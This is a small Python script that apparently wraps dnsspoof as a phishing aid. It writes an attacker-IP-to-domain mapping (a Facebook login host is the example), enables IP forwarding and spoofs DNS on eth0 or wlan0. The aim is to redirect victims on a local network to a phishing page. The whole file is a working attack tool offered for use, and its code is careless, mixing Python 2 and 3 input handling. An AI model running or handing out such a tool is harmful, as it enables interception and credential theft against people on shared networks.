from os import system
import sys


print ("[1] start the attack")
print ("[2]exit")
option = input("==>")
if option == 1:
    system("clear")
else:
    system("clear")
    print ("thanks for using the tool")
    exit()


print ("Enter your ipaddres to redirected to")
print ("Next enter the link that you want to send to victim")
print ("Dont forget to make space beetwen yourip and link EX:-192.168.200.130  sevice.login.facebook") 

file = open("hosts.txt", "w")
option3 = raw_input("==>")
file.write(option3)
file.close()

print ("[1] for selecting eth0 as interface")
print ("[2] for selecting wlan0 as interface")
print ("[3] exit")
option2 = input("==>")
if option2 == 1:
  system("echo 1 > /proc/sys/net/ipv4/ip_forward")
  print ("trying to find victum on eth0 .........................")
  print ("now please youth your phishing tool")
  system("dnsspoof  -i eth0 -f hosts.txt")
if option2 == 2:
  system("echo 1 > /proc/sys/net/ipv4/ip_forward")
  print ("trying to find victumon wlan0........................... ")
  print ("now please youth your phishing tool")
  system("dnsspoof  -i wlan0 -f hosts.txt")
if option2 == 3:
  system("clear")
  print ("thanks for using the tool")
  exit()
